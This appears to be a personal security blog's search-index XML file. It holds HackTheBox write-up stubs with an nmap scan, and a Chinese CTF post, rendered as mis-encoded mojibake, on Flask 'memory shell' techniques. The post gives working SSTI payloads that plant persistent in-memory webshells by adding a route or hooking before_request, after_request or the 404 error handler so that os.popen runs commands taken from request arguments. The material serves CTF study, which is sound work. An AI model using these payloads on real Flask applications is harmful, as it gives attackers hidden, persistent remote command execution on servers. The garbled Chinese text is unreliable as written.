<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>HTB-Linkvortex</title>
      <link href="/2026/02/14/HTB-Linkvortex/"/>
      <url>/2026/02/14/HTB-Linkvortex/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> HackTheBox </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>HTB-Pterodactyl</title>
      <link href="/2026/02/14/HTB-Pterodactyl/"/>
      <url>/2026/02/14/HTB-Pterodactyl/</url>
      
        <content type="html"><![CDATA[<h1 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h1><h1 id="Subdomain"><a href="#Subdomain" class="headerlink" title="Subdomain"></a>Subdomain</h1><h1 id="CVE"><a href="#CVE" class="headerlink" title="CVE-"></a>CVE-</h1>]]></content>
      
      
      <categories>
          
          <category> HackTheBox </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>HTB-Facts</title>
      <link href="/2026/02/02/HTB-Facts/"/>
      <url>/2026/02/02/HTB-Facts/</url>
      
        <content type="html"><![CDATA[<h1 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h1><p>Nmapæ‰«æç«¯å£</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliğŸ‘»Thr2on1)-[~/Websec/HTB/Facts]</span><br><span class="line">â””â”€$ <span class="built_in">sudo</span> nmap -p- --min-rate 10000 10.129.35.87 -oA nmapscans/ports</span><br><span class="line">Nmap scan report <span class="keyword">for</span> facts.htb (10.129.35.87)</span><br><span class="line">Host is up (0.16s latency).</span><br><span class="line">Not shown: 65532 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">22/tcp    open  ssh</span><br><span class="line">80/tcp    open  http</span><br><span class="line">54321/tcp open  unknown</span><br></pre></td></tr></table></figure><p>å¼€æ”¾äº†22ã€80ã€54321ç«¯å£</p><h1 id="Camaleon-CMS"><a href="#Camaleon-CMS" class="headerlink" title="Camaleon CMS"></a>Camaleon CMS</h1><h1 id="Foothold"><a href="#Foothold" class="headerlink" title="Foothold"></a>Foothold</h1><h1 id="ROOT"><a href="#ROOT" class="headerlink" title="ROOT"></a>ROOT</h1>]]></content>
      
      
      <categories>
          
          <category> HackTheBox </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Flaskæ— å›æ˜¾RCE</title>
      <link href="/2025/05/29/Flask%E6%97%A0%E5%9B%9E%E6%98%BERCE/"/>
      <url>/2025/05/29/Flask%E6%97%A0%E5%9B%9E%E6%98%BERCE/</url>
      
        <content type="html"><![CDATA[<h2 id="debugæ¨¡å¼"><a href="#debugæ¨¡å¼" class="headerlink" title="debugæ¨¡å¼"></a>debugæ¨¡å¼</h2><p>å¦‚æœç¨‹åºå¼€å¯äº†debugæ¨¡å¼ï¼Œé‚£ä¹ˆä¸€èˆ¬æ˜¯è¦è®¡ç®—pinå€¼ï¼Œè®¡ç®—å‡ºpinå€¼å°±å¾ˆç®€å•äº†ã€‚</p><h2 id="édebugæ¨¡å¼"><a href="#édebugæ¨¡å¼" class="headerlink" title="édebugæ¨¡å¼"></a>édebugæ¨¡å¼</h2><h3 id="0x01-æ—§ç‰ˆå†…å­˜é©¬"><a href="#0x01-æ—§ç‰ˆå†…å­˜é©¬" class="headerlink" title="0x01 æ—§ç‰ˆå†…å­˜é©¬"></a>0x01 æ—§ç‰ˆå†…å­˜é©¬</h3><p>ä½ç‰ˆæœ¬çš„flask(ssti)ä¸€èˆ¬å¯ä»¥ç›´æ¥ä½¿ç”¨ä»¥ä¸‹payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;,&#123;&#x27;_request_ctx_stack&#x27;:url_for.__globals__[&#x27;_request_ctx_stack&#x27;],&#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]&#125;)</span><br></pre></td></tr></table></figure><p><strong>åŸç†</strong>:</p><p>ç¬¬ä¸€è¡Œåˆ©ç”¨url_forå‡½æ•°ä½œä¸ºå…¥å£ç‚¹è·å–äº†å½“å‰å‘½åç©ºé—´çš„__builtins__æ¨¡å—ï¼Œç„¶åè°ƒç”¨evalå‡½æ•°ã€‚<br>è¿™ä¸ªevalä¼ å…¥äº†ä¸¤ä¸ªå‚æ•°ï¼Œçœ‹ç¬¬äºŒä¸ª</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#x27;_request_ctx_stack&#x27;:url_for.__globals__[&#x27;_request_ctx_stack&#x27;],</span><br><span class="line">    &#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œéœ€è¦ä»‹ç»ä¸€ä¸‹evalçš„ç¬¬äºŒä¸ªå‚æ•°ï¼š<br>evalçš„ç¬¬äºŒä¸ªå‚æ•°å…è®¸ä¼ å…¥ä¸€ä¸ªå­—å…¸ï¼Œä¸€èˆ¬æ˜¯ç”¨æ¥æŒ‡å®šè¡¨è¾¾å¼æ‰§è¡Œçš„<strong>å…¨å±€å˜é‡å‘½åç©ºé—´ï¼ˆglobalsï¼‰</strong><br>æ¥ä¸‹æ¥å†å»ç†è§£ç¬¬äºŒä¸ªå‚æ•°ä¸­ä¼ å…¥çš„å€¼å°±å¾ˆå¥½äº†ã€‚<br><code>_request_ctx_stack</code>æ˜¯ä¸€ä¸ªè¯·æ±‚ä¸Šä¸‹æ–‡æ ˆã€‚è¯·æ±‚ä¸Šä¸‹æ–‡æ˜¯æŒ‡åœ¨å¤„ç†HTTPè¯·æ±‚çš„è¿‡ç¨‹ä¸­ï¼ŒFlaskåˆ›å»ºçš„ä¸€ä¸ªä¸´æ—¶ç¯å¢ƒï¼Œç”¨æ¥å­˜å‚¨å’Œç®¡ç†ä¸å½“å‰è¯·æ±‚ç›¸å…³çš„ä¿¡æ¯<br><code>url_for.__globals__[&#39;current_app&#39;]</code>æ˜¯å½“å‰è¿è¡Œçš„appã€‚<br>ç„¶åçœ‹ä¸€ä¸‹æ‰§è¡Œçš„ä»£ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;app.add_url_rule(</span><br><span class="line">        &#x27;/shell&#x27;, </span><br><span class="line">        &#x27;shell&#x27;, </span><br><span class="line">        lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;</span><br></pre></td></tr></table></figure><p>app.add_url_rule()æ˜¯ä¸€ä¸ªå¯ä»¥ç”¨æ¥åŠ¨æ€çš„æ·»åŠ è·¯ç”±çš„æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ªæ–¹æ³•åŠ¨æ€çš„æ·»åŠ ä¸€ä¸ªè·¯ç”±ï¼Œå…¶ä¸­æˆ‘ä»¬å¯ä»¥é€šè¿‡åŒ¿åå‡½æ•°æ¥å¤„ç†è¿™ä¸ªè·¯ç”±çš„è¯·æ±‚ã€‚<br>ä¸ºäº†è·å–æˆ‘ä»¬æ³¨å…¥çš„å‘½ä»¤ï¼Œæˆ‘ä»¬è¿˜éœ€è¦å½“å‰HTTPè¯·æ±‚çš„requestå¯¹è±¡ï¼Œè¿™ä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¸€å¼€å§‹è¦è·å–<code>_request_ctx_stack</code>çš„åŸå› ã€‚åœ¨è¿™ä¸ªæ ˆé‡Œï¼Œæ ˆé¡¶å…ƒç´ _request_ctx_stack.topè‡ªç„¶å°±æ˜¯æˆ‘ä»¬å½“å‰è¯·æ±‚çš„ä¸Šä¸‹æ–‡ï¼Œå…¶ä¸­åŒ…å«requestå¯¹è±¡ï¼Œäºæ˜¯æˆ‘ä»¬å°±å¯ä»¥è·å–å½“å‰è¯·æ±‚GETä¼ å‚çš„å€¼ï¼Œè¿›è€Œæ‰§è¡Œæˆ‘ä»¬ä¼ å…¥çš„å‘½ä»¤ã€‚</p><h3 id="0x02-æ–°ç‰ˆå†…å­˜é©¬"><a href="#0x02-æ–°ç‰ˆå†…å­˜é©¬" class="headerlink" title="0x02 æ–°ç‰ˆå†…å­˜é©¬"></a>0x02 æ–°ç‰ˆå†…å­˜é©¬</h3><p>æ¯”è¾ƒæ–°çš„flaskç‰ˆæœ¬ï¼Œä¸å…è®¸æˆ‘ä»¬åœ¨è¿è¡Œappçš„æ—¶å€™è°ƒç”¨å®ƒçš„add_url_ruleå‡½æ•°ã€‚<br>åœ¨é˜…è¯»äº†å¤§ä½¬ä»¬å†™çš„æ–‡ç« åï¼Œæˆ‘å¾—çŸ¥äº†å¯ä»¥ä½¿ç”¨flaskè‡ªå¸¦çš„é’©å­å‡½æ•°ï¼Œæ¥è¾¾åˆ°æ³¨å…¥å†…å­˜é©¬çš„ç›®çš„ã€‚</p><p><strong>before_request</strong></p><p>before_request()æ˜¯Flaskä¸‹çš„ä¸€ä¸ªè§£é‡Šå™¨ï¼ŒæœåŠ¡ç«¯åœ¨å¤„ç†è¯·æ±‚ä¹‹å‰ä¼šè°ƒç”¨before_requestæ‰€è®¾ç½®çš„å›è°ƒå‡½æ•°å¯¹è¯·æ±‚è¿›è¡Œé¢„å¤„ç†ï¼Œæ¯”å¦‚è¯´ï¼Œèº«ä»½éªŒè¯ã€æƒé™æ£€æŸ¥ç­‰ã€‚<br>æˆ‘ä»¬å¯ä»¥é€šè¿‡è°ƒç”¨app.before_request_funcs.setdefault()å‡½æ•°æ¥ä¸ºæˆ‘ä»¬çš„before_requestè®¾ç½®å¤„ç†å‡½æ•°ï¼Œåœ¨SSTIçš„è¿‡ç¨‹ä¸­æˆ‘ä»¬éœ€è¦è·å–åˆ°evalå‡½æ•°æˆ–è€…execå‡½æ•°æ¥æ’å…¥å†…å­˜é©¬ã€‚<br>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].before_request_funcs.setdefault(None,[]).append(lambda :__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read())</span><br></pre></td></tr></table></figure><p>è·Ÿæ—§ç‰ˆçš„ä¸€æ ·ï¼Œæˆ‘ä»¬éœ€è¦å…ˆè·å–ä¸Šä¸‹æ–‡ã€‚<br>å› æ­¤åœ¨evalæ‰§è¡Œå‘½ä»¤çš„æ—¶å€™æˆ‘ä»¬å¯ä»¥ä½¿ç”¨:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.before_request_funcs.setdefault(None,[]).append(lambda :__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()),&#123;&#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯åŸå†…å®¹ä¼šè¢«before_requestçš„è¿”å›å†…å®¹è¦†ç›–ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨after_requestè§£å†³è¿™ä¸ªé—®é¢˜ã€‚</p><p><strong>after_request</strong></p><p>å…ˆçœ‹ä»¥ä¸‹å‡½æ•°ä»‹ç»ï¼š<br><img src="https://raw.githubusercontent.com/Thr2on1/BlogImages/main/img/Pasted%20image%2020250417093253.png" alt="Pasted image 20250417093253"><br>è¿™ä¸ªè§£é‡Šå™¨è¦æ±‚æˆ‘ä»¬æ¥æ”¶ä¸€ä¸ªresponseå¯¹è±¡ï¼Œå¹¶ä¸”è¿”å›ä¸€ä¸ªresponseå¯¹è±¡ã€‚å› æ­¤æˆ‘ä»¬åœ¨å®šä¹‰åŒ¿åå‡½æ•°çš„æ—¶å€™éœ€è¦è®¾ç½®ä¸€ä¸ªå‚æ•°(é»˜è®¤ä¸ºresposeç±»å‹)<br>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.after_request_funcs.setdefault(None,[]).append(lambda resp: make_response(__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read()) if request.args.get(&#x27;cmd&#x27;) else resp)</span><br></pre></td></tr></table></figure><p>SSTIä¸­ç”¨æ³•è·Ÿbefore_requestä¸€æ ·ã€‚</p><p><strong>teardown_request</strong></p><p>è·Ÿafter_requestç”¨æ³•ä¸€æ¨¡ä¸€æ ·ï¼Œä½†æ˜¯æ²¡æœ‰å›æ˜¾ã€‚</p><p><strong>errorhandler</strong></p><p>errorhandlerè£…é¥°å™¨å…è®¸æˆ‘ä»¬è‡ªå®šä¹‰æŠ¥é”™ç•Œé¢<br>æ¯”å¦‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@app.errorhandler(404)</span><br><span class="line">def error():</span><br><span class="line">return &quot;404!!!&quot;</span><br></pre></td></tr></table></figure><p>é€šè¿‡errorhandlerç»‘å®šä¸€ä¸ªé’©å­å‡½æ•°ï¼Œç„¶åHTTPçŠ¶æ€ç ä¸º404æ—¶å°±è°ƒç”¨æˆ‘ä»¬è‡ªå®šä¹‰çš„å‡½æ•°ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åŠ ä»¥åˆ©ç”¨ã€‚<br>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec(&quot;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;gxngxngxn&#x27;)).read()&quot;)</span><br></pre></td></tr></table></figure><p>è¦ç”¨execæ‰§è¡Œå‘½ä»¤ï¼Œevalä¸æ”¯æŒæ‰§è¡Œå¤šæ¡pythonå‘½ä»¤ã€‚</p><h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><p><a href="https://www.cnblogs.com/gxngxngxn/p/18181936">æ–°ç‰ˆFLASKä¸‹pythonå†…å­˜é©¬çš„ç ”ç©¶ - gxngxngxn - åšå®¢å›­</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> Flask </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
